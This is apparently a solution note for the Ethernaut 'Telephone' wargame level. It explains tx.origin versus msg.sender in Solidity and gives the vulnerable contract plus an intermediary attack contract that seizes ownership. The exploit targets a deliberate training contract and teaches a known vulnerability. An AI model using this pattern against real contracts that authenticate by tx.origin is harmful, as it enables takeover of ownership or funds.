[4 - Telephone](https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe)

Solution: 
* Externally-owned-account -> contract A => tx.origin = msg.sender = EOA address
* Externally-owner-account -> contract A -> contract B => tx.origin = EOA address, msg.sender = contract A
* Solution is to call another contract A, which calls Telephone's **changeOwner**
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneSolution {
    Telephone private constant telephoneContract = Telephone(0x61072A4015b3f30604EA370daf4b610B36D94758);

    function solve(address _owner) external {
        telephoneContract.changeOwner(_owner);
    }
}

await contract.owner(); // to check owner changed
```
* I deployed this using Remix IDE, and then called TelephoneSolution.solve with my address.
* 